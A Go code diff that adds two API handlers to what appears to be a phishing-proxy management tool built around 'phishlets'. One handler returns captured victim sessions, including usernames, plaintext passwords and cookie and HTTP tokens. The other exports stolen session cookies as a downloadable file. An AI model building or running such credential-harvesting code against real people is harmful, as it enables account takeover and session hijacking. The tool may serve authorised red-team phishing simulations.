@@ -138,6 +138,49 @@ func (r *Router) disableMiragedPhishlet(w http.ResponseWriter, req *http.Request
 	writeJSON(w, http.StatusOK, miragedPhishletToResponse(*phishlet))
 }
 
+func (r *Router) getMiragedSession(w http.ResponseWriter, req *http.Request) {
+	connectionID := req.PathValue("id")
+	sessionID := req.PathValue("sessionId")
+
+	session, err := r.Miraged.GetSession(connectionID, sessionID)
+	if err != nil {
+		r.writeError(w, http.StatusBadGateway, "failed to get session", err)
+		return
+	}
+
+	writeJSON(w, http.StatusOK, sdk.MiragedSessionResponse{
+		ID:           session.ID,
+		Phishlet:     session.Phishlet,
+		RemoteAddr:   session.RemoteAddr,
+		UserAgent:    session.UserAgent,
+		Username:     session.Username,
+		Password:     session.Password,
+		Custom:       session.Custom,
+		CookieTokens: session.CookieTokens,
+		BodyTokens:   session.BodyTokens,
+		HTTPTokens:   session.HTTPTokens,
+		StartedAt:    session.StartedAt,
+		CompletedAt:  session.CompletedAt,
+	})
+}
+
+func (r *Router) exportMiragedSessionCookies(w http.ResponseWriter, req *http.Request) {
+	connectionID := req.PathValue("id")
+	sessionID := req.PathValue("sessionId")
+
+	data, err := r.Miraged.ExportSessionCookies(connectionID, sessionID)
+	if err != nil {
+		r.writeError(w, http.StatusBadGateway, "failed to export cookies", err)
+		return
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	w.Header().Set("Content-Disposition", "attachment; filename=cookies.json")
+	if _, err := w.Write(data); err != nil {
+		r.Logger.Error("failed to write cookie export response", "error", err)
+	}
+}
+
 func miragedPhishletToResponse(p phishing.MiragedPhishlet) sdk.MiragedPhishletResponse {
 	return sdk.MiragedPhishletResponse{
 		Name:        p.Name,
